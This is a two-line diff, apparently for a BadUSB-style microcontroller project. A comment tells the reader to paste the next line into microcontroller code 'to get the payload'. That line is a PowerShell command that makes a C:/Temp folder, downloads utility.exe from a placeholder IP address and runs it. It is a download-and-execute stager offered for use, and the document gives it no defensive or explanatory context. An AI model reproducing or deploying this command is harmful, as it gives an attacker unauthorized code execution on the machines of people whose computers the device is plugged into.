@@ -1,0 +1,2 @@
+# copy the following line and paste it into you microcontroller code to get the payload
+"powershell mkdir C:/Temp -Force; iwr http://XXX.XXX.XXX.XXX/utility.exe -OutFile C:/Temp/utility.exe; Start-Process C:/Temp/utility.exe"
